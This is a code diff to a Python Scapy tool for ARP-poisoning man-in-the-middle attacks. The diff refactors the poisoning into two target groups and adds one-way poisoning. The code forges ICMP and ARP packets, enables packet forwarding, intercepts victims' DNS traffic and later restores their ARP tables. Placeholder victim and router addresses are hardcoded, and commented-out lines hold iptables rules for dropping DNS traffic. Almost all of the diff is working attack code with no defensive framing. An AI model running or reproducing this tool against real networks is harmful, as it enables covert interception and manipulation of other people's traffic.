@@ -30,18 +30,13 @@ def forge_arp_request(src_ip, src_mac, dst_ip, dst_mac):
     	hwdst="00:00:00:00:00:00"
 	)
 	
-def poison_loop(forged_icmp_echo_requests, forged_replies, forged_requests, interface, iterations, stop_event):
+def poison_loop(forged_packets, interface, iterations, stop_event):
 	i = 1
 	# Repeatedly sends each forged response at once and then sleeps for [interval] seconds
-	while (iterations == 0 and not stop_event.is_set()) or i <= iterations:
+	while not stop_event.is_set() and (iterations == 0 or i <= iterations):
 		# Send packets based on the config settings
 		print("Sending poison packets...")
-		if (config.arp_poison_icmp):
-			sendp(forged_icmp_echo_requests, iface=interface, verbose=False)
-		if (config.arp_poison_reply):
-			sendp(forged_replies, iface=interface, verbose=False)
-		if (config.arp_poison_request):
-			sendp(forged_requests, iface=interface, verbose=False)
+		sendp(forged_packets, iface=interface, verbose=False)
 
 		# For the first 5 poison batches use the warm up delay
 		if i < 5:
@@ -58,34 +53,37 @@ def poison_loop(forged_icmp_echo_requests, forged_replies, forged_requests, inte
 					return
 		i += 1
 	
-def start_arp_mitm(victims, self_mac, interface):
-	# create a list of each forged response,
-	# so each victim gets all other victims spoofed with the mac of this device
-	forged_icmp_echo_requests = [
-		forge_icmp_echo_request(ip1, ip2, mac2)
-		for (ip1, mac1) in victims
-		for (ip2, mac2) in victims
-		if (ip1, mac1) != (ip2, mac2)
-	]
+def start_arp_mitm(group1, group2, self_mac, interface):
+	# create a list of each forged responses
+	# every device in group1 gets the devices in group2 spoofed by this device
+	# if one way poisoning is not enabled, then the other way around as well
+	forged_packets = []
 
-	forged_replies = [
-		forge_arp_reply(ip1, self_mac, ip2, mac2)
-		for (ip1, mac1) in victims
-		for (ip2, mac2) in victims
-		if (ip1, mac1) != (ip2, mac2)
-	]
+	for (ip1, mac1) in group1:
+		for (ip2, mac2) in group2:
+			if (ip1, mac1) != (ip2, mac2):
+				# ICMP echo request
+				if config.arp_poison_icmp:
+					forged_packets.append(forge_icmp_echo_request(ip2, ip1, mac1))
+					if not config.arp_poison_oneway:
+						forged_packets.append(forge_icmp_echo_request(ip1, ip2, mac2))
 
-	forged_requests = [
-		forge_arp_request(ip1, self_mac, ip2, mac2)
-		for (ip1, mac1) in victims
-		for (ip2, mac2) in victims
-		if (ip1, mac1) != (ip2, mac2)
-	]
+				# ARP reply
+				if config.arp_poison_reply:
+					forged_packets.append(forge_arp_reply(ip2, self_mac, ip1, mac1))
+					if not config.arp_poison_oneway:
+						forged_packets.append(forge_arp_reply(ip1, self_mac, ip2, mac2))
+
+				# ARP request
+				if config.arp_poison_request:
+					forged_packets.append(forge_arp_request(ip2, self_mac, ip1, mac1))
+					if not config.arp_poison_oneway:
+						forged_packets.append(forge_arp_request(ip1, self_mac, ip2, mac2))
 
 	# event to signal that the poison_loop thread should stop
 	stop_event = threading.Event()
 
-	thread = threading.Thread(target=poison_loop, args=(forged_icmp_echo_requests, forged_replies, forged_requests, interface, 0, stop_event), daemon=True)
+	thread = threading.Thread(target=poison_loop, args=(forged_packets, interface, 0, stop_event), daemon=True)
 
 	thread.start()
 
@@ -94,32 +92,35 @@ def start_arp_mitm(victims, self_mac, interface):
 	# todo find good timings for sending poison/stealth mode(?) (base on OS?)
 
     
-def stop_arp_mitm(thread, stop_event, interface):
+def stop_arp_mitm(thread, group1, group2, stop_event, interface):
 	print("Stopping ARP poisoning thread...")
 	# signal the poison thread to stop
 	stop_event.set()
 	thread.join()
 
 	# create forged packets to restore the arp tables of the victims to the valid values
-	forged_replies = [
-		forge_arp_reply(ip1, mac1, ip2, mac2)
-		for (ip1, mac1) in victims
-		for (ip2, mac2) in victims
-		if (ip1, mac1) != (ip2, mac2)
-	]
+	forged_packets = []
 
-	forged_requests = [
-		forge_arp_request(ip1, mac1, ip2, mac2)
-		for (ip1, mac1) in victims
-		for (ip2, mac2) in victims
-		if (ip1, mac1) != (ip2, mac2)
-	]
+	for (ip1, mac1) in group1:
+		for (ip2, mac2) in group2:
+			if (ip1, mac1) != (ip2, mac2):
+				# ARP reply
+				if config.arp_poison_reply:
+					forged_packets.append(forge_arp_reply(ip2, mac1, ip1, mac1))
+					if not config.arp_poison_oneway:
+						forged_packets.append(forge_arp_reply(ip1, mac1, ip2, mac2))
+
+				# ARP request
+				if config.arp_poison_request:
+					forged_packets.append(forge_arp_request(ip2, mac1, ip1, mac1))
+					if not config.arp_poison_oneway:
+						forged_packets.append(forge_arp_request(ip1, mac1, ip2, mac2))
 
 	print("Re-poisoning the victims to restore the valid ARP entries...")
 	# create a new stop_event for the repoisoning
 	stop_event = threading.Event()
 	# run the poison loop 3 times to restore the valid entries
-	poison_loop(None, forged_replies, forged_requests, interface, 3, stop_event)
+	poison_loop(forged_packets, interface, 3, stop_event)
 	
 def only_dns(pkt):
 	return pkt.haslayer(DNS)
@@ -129,20 +130,20 @@ def print_fn(pkt, ips, interface):
 	print(f"summary: {pkt.summary()}")
 	# spoof_dns(pkt, victim_ip, router_ip, interface)
 	
-def start_attack(victims, self_ip, self_mac, interface):
+def start_attack(group1, group2, self_ip, self_mac, interface):
 	enable_kernel_forwarding(interface)
 
-	thread, stop_event = start_arp_mitm(victims, self_mac, interface)
+	thread, stop_event = start_arp_mitm(group1, group2, self_mac, interface)
 		
 	# Temp: make this function later	
 	# run("iptables -I FORWARD -p udp --dport 53 -j DROP")
 	# run("iptables -I FORWARD -p tcp --dport 53 -j DROP")
 		
-	intercept_pkts(victims, self_mac, interface, only_dns, print_fn)
+	intercept_pkts(group1, group2, self_mac, interface, only_dns, print_fn)
 
 	input("\nstop")
 
-	stop_arp_mitm(thread, stop_event, interface)
+	stop_arp_mitm(thread, group1, group2, stop_event, interface)
 	cleanup_forward(interface)
 
 # placeholder
@@ -153,7 +154,8 @@ router_mac = "00:0c:29:87:40:17"
 self_ip = "192.168.1.100"
 self_mac = "00:0c:29:ef:9c:1d"
 interface = "eth0"
-victims = [(victim_ip, victim_mac), (router_ip, router_mac)]
+group1 = [(victim_ip, victim_mac)]
+group2 = [(router_ip, router_mac)]
 
 # start the attack with the placeholder values to avoid having to go through discovery every time for testing
-# start_attack(victims, self_ip, self_mac, interface)
+# start_attack(group1, group2, self_ip, self_mac, interface)
